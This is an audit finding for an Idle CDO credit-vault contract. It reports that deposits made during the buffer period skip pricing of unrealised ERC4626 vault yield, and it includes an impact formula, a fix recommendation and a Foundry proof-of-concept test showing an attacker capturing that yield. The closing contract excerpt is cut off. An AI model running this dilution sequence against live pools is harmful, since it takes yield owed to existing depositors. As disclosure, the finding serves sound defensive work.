### Title
Buffer deposits in programmable-borrower vaults do not price unclaimed ERC4626 yield - (File: contracts/IdleCDOEpochVariant.sol)

### Summary

In a programmable-borrower deployment, yield accrued by the external ERC4626 vault during the buffer is tracked only by `ProgrammableBorrower.bufferedVaultDelta`, not by `IdleCDOEpochVariant.getContractValue()`. A KYC-passing depositor can therefore deposit during the buffer at a tranche price that excludes this already-earned yield, then receive part of that yield when the next `stopEpoch` consumes `totalInterestDueNow()` and mints strategy-token interest.

### Finding Description

`IdleCDOCreditVault.getContractValue()` values the pool as CDO-held `strategyToken` plus raw `token`, minus `unclaimedFees`; it does not include assets held inside the programmable borrower's ERC4626 vault or pending vault PnL [1](#0-0) . During the buffer after a normal stop, `_stopEpoch` unpauses deposits and reopens withdrawal requests when `skipDefaultCheck` is false [2](#0-1) .

A deposit calls `_updateAccounting()` and then mints shares from the stale saved/current tranche price [3](#0-2) . Separately, `ProgrammableBorrower.onStopEpoch` snapshots `bufferStartVaultAssets` after epoch accounting stops, so subsequent ERC4626 appreciation is buffer yield rather than CDO NAV [4](#0-3) . At the next `startEpoch`, `onStartEpoch` carries that appreciation into `bufferedVaultDelta` [5](#0-4) . The next `totalInterestDueNow()` includes it through `_vaultNetInterest()` [6](#0-5) , and `stopEpoch` mints the resulting interest into the CDO and updates tranche prices [7](#0-6) .

The broken invariant is fair mint/burn: a depositor mints against NAV that excludes accrued-but-unrealized vault yield, then shares in that same yield once it is realized.

### Impact Explanation

If pre-deposit tranche NAV is `N`, pending buffer vault yield is `Y`, fees are zero, and the attacker deposits `D`, the attacker mints approximately `D / p` shares at price `p`. When `Y` is later realized, the attacker receives approximately:

```text
stolenValue ~= Y * D / (N + D)
```

bounded by fees and rounding. For example, with `N = 10_000 USDC`, `Y = 100 USDC`, and `D = 90_000 USDC`, the attacker obtains about `90 USDC` of previously unpriced yield. Larger deposits capture a larger fraction of `Y`, subject to the vault's deposit limit.

### Likelihood Explanation

The attacker only needs to pass the vault's normal wallet eligibility and deposit during the buffer while external vault yield is pending. No privileged action, malicious borrower, default, reentrancy, or direct token donation is required. The yield is later consumed by the normal owner/manager `startEpoch`/`stopEpoch` sequence.

Existing guards do not prevent it: `_skimDonatedAssets()` removes only raw underlying held directly by the CDO, while the pending yield remains represented by ERC4626 shares inside `ProgrammableBorrower` [8](#0-7) . `depositDuringEpoch` is disabled for programmable borrowers, but this concern explicitly applies to that path only; ordinary buffer deposits remain available after the CDO is unpaused [9](#0-8) .

### Recommendation

Include pending programmable-borrower yield in the NAV used to mint tranche tokens during the buffer. Conceptually, `getContractValue()` or the accounting path for programmable borrowers should add the currently accrued but unrealized positive vault/buffer yield exposed by `ProgrammableBorrower.totalInterestDueNow()` or a dedicated buffer-yield view, while preserving loss isolation and fee accounting. Deposits should be priced against `strategyToken backing + recognized pending yield - fees`, not only CDO-held strategy tokens.

### Proof of Concept

Reproducible Foundry fork PoC, based on `test/foundry/ProgrammableBorrowerCreditVault.t.sol`:

```solidity
function testBufferDepositDilutesPendingVaultYield() external {
    uint256 amount = 10_000 * oneScale;
    uint256 attackerAmount = 90_000 * oneScale;
    address attacker = makeAddr("attacker");

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    // Existing LP initializes the pool and epoch 0 starts.
    idleCDO.depositAA(amount);
    _startEpochAndCheckPrices(0);

    // Honest manager stops epoch 0. The programmable borrower keeps its vault position.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    uint256 baselineVaultAssets = _programmableVaultAssets();
    uint256 attackerShares;
    uint256 navBefore;

    // During the buffer, the external Morpho vault accrues yield. This yield is still
    // absent from CDO strategyToken NAV.
    vm.warp(block.timestamp + 5 days);
    _accrueMorphoVaultInterest();

    uint256 pendingYield = _programmableVaultAssets() - baselineVaultAssets;
    assertGt(pendingYield, 0);

    navBefore = cdoEpoch.getContractValue();
    assertEq(navBefore, strategyToken.balanceOf(address(cdoEpoch)));

    // KYC/whitelist is disabled in this fixture. In a configured pool, attacker is a
    // normal KYC-passing lender, not a privileged role.
    deal(USDC, attacker, attackerAmount, true);
    vm.startPrank(attacker);
    underlying.approve(address(cdoEpoch), type(uint256).max);
    attackerShares = idleCDO.depositAA(attackerAmount);
    vm.stopPrank();

    // The deposit increased NAV only by principal; pending vault yield remains unpriced.
    assertApproxEqAbs(
        cdoEpoch.getContractValue(),
        navBefore + attackerAmount,
        1
    );

    // Honest operators start and stop epoch 1. onStartEpoch carries the buffer yield,
    // and stopEpoch mints it as strategy-token interest.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    vm.warp(cdoEpoch.epochEndDate() + 1);
    _accrueMorphoVaultInterest();

    uint256 realizedInterest = programmableBorrower.totalInterestDueNow();
    assertGe(realizedInterest, pendingYield);

    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // The attacker's tranche tokens now redeem against NAV that includes the pending
    // yield that was excluded when the shares were minted.
    uint256 attackerValue =
        attackerShares * cdoEpoch.virtualPrice(address(aaTranche)) / ONE_TRANCHE_TOKEN;

    uint256 expectedFloor =
        attackerAmount + pendingYield * attackerAmount / (amount + attackerAmount);

    // Approximation covers share-price rounding and any subsequent vault PnL.
    assertGe(attackerValue + 10, expectedFloor);
}
```

  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
